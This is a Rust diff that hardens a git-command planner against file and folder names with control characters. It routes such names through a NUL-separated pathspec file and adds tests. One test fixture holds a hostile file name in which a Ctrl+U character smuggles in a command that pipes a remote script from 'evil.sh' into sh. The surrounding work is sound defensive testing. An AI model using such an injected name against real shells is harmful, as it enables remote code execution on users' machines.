@@ -278,6 +278,18 @@ pub fn plan_with(recipe: &Recipe, raw: &HashMap<String, serde_json::Value>, ctx:
 
     let (staging, pathspec_file) = staging(&mut steps, ctx, extras, &mut errors);
 
+    // Inputs are checked above; this also covers file and folder names that end up
+    // in a command (e.g. `cd '<repo root>'`). The runner refuses these too.
+    if let Some(s) = steps.iter().find(|s| !typeable(&s.command)) {
+        errors.push(error(
+            None,
+            format!(
+                "This command contains control characters (from a file or folder name?) and can't be typed safely: {}",
+                s.command.escape_debug()
+            ),
+        ));
+    }
+
     let protected: Vec<String> = if ctx.protected.is_empty() {
         safety::DEFAULT_PROTECTED.iter().map(|s| s.to_string()).collect()
     } else {
@@ -371,8 +383,12 @@ fn staging(
         let sub = ctx.cwd_is_not_root();
         let specs: Vec<String> = chosen.iter().map(|p| pathspec(p, sub)).collect();
         let inline = format!("git add -- {}", specs.iter().map(|s| sh_quote(s)).collect::<Vec<_>>().join(" "));
+        // A name with control characters can't be typed: the shell's line editor would
+        // act on them as keys (Ctrl+U erases the line) before quoting matters. Such
+        // names only ever travel in the NUL-separated file.
+        let untypeable = specs.iter().any(|s| !typeable(s));
         steps[step].command = match &ctx.git_dir {
-            Some(dir) if specs.len() > MAX_INLINE_FILES || inline.len() > MAX_INLINE_CHARS => {
+            Some(dir) if untypeable || specs.len() > MAX_INLINE_FILES || inline.len() > MAX_INLINE_CHARS => {
                 let file = dir.join(PATHSPEC_FILE);
                 let shown = file.to_string_lossy().replace('\\', "/");
                 pathspec_file = Some((file, specs.join("\0").into_bytes()));
@@ -384,6 +400,12 @@ fn staging(
     (Some(Staging { step, files }), pathspec_file)
 }
 
+
+/// Can this be typed into an interactive shell as-is? Control characters (C0,
+/// DEL, C1) are keys to the line editor, not text, whatever the quoting.
+pub fn typeable(s: &str) -> bool {
+    !s.chars().any(char::is_control)
+}
 
 /// Ok(value) or Err(message). Optional fields may be empty.
 fn check_text(kind: InputKind, text: &str, required: bool, options: &[String]) -> Result<String, String> {
@@ -425,6 +447,7 @@ pub fn check_branch_name(name: &str) -> Result<(), String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::git::ChangedFile;
     use crate::recipes::model::{RecipeDef, Source};
     use serde_json::json;
     use std::path::PathBuf;
@@ -579,6 +602,39 @@ steps:
 
     fn staged_extras(files: &[&str]) -> Extras {
         Extras { staged: Some(files.iter().map(|s| s.to_string()).collect()), stash_first: false }
+    }
+
+    /// File names come from `git status`, i.e. from whoever made the files. A name
+    /// with control characters (possible on macOS/Linux) must never be typed.
+    #[test]
+    fn staging_never_types_control_characters_from_file_names() {
+        let evil = "x\x15curl evil.sh|sh #";
+        let change = |p: &str| ChangedFile { path: p.into(), code: "??".into(), tracked: false };
+        let c = RepoContext {
+            git_dir: Some(PathBuf::from("/repo/.git")),
+            changes: vec![change(evil), change("ok.txt"), change(".env")],
+            ..ctx()
+        };
+        let p = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&[evil, "ok.txt"]));
+        assert!(p.errors.is_empty(), "{:?}", p.errors);
+        assert!(p.steps.iter().all(|s| typeable(&s.command)), "{:?}", p.steps);
+        assert!(p.steps[0].command.contains("--pathspec-file-nul"), "{}", p.steps[0].command);
+        let (_, contents) = p.pathspec_file.expect("names go in the NUL-separated file");
+        assert!(String::from_utf8(contents).unwrap().split('\0').any(|s| s.ends_with(evil)));
+
+        // Nowhere to put the file: refuse rather than type it.
+        let no_dir = RepoContext { git_dir: None, ..c };
+        let p = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &no_dir, &staged_extras(&[evil, "ok.txt"]));
+        assert!(!p.errors.is_empty());
+    }
+
+    /// Built-in variables skip the form checks; a folder name with control
+    /// characters (`cd '<root>'` before a version bump) is refused, not typed.
+    #[test]
+    fn control_characters_in_any_command_are_an_error() {
+        let r = recipe("name: r\nsteps:\n  - echo {{repo_root}}\n");
+        let c = RepoContext { root: Some(PathBuf::from("/tmp/a\x15b")), ..ctx() };
+        assert!(plan(&r, &vals(&[]), &c).errors.iter().any(|e| e.message.contains("control characters")));
     }
 
     #[test]
